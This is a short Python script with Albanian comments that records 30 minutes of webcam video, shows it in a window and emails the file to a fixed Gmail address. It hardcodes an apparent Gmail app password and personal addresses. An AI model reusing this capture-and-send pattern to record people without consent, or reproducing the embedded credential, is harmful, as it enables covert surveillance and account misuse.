import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time

# Funksioni për dërgimin e emailit me video
def send_email(file_path):
    fromaddr = "emriyt@gmail.com"  # Adresa e email-it nga ku dërgohet
    toaddr = "Evikaja31@gmail.com"  # Adresa e email-it ku do të dërgohet video
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Video e kapur"

    # Hapur video
    part = MIMEBase('application', 'octet-stream')
    with open(file_path, "rb") as attachment:
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={file_path}')
    msg.attach(part)

    # Dërgimi i emailit
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "zmfuccqzwtkvgnez")  # Përdorimi i App Password
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# Funksioni për kapjen e videos
def capture_video():
    cap = cv2.VideoCapture(0)  # Përdorimi i kamerës pasme
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('video_capture.avi', fourcc, 20.0, (640, 480))
    
    start_time = time.time()
    while True:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
            cv2.imshow('Video', frame)
        if time.time() - start_time > 1800:  # 30 minuta
            break

    cap.release()
    out.release()
    cv2.destroyAllWindows()

    # Dërgimi i videos në email
    send_email('video_capture.avi')

# Kryeni procesin
if __name__ == "__main__":
    capture_video()
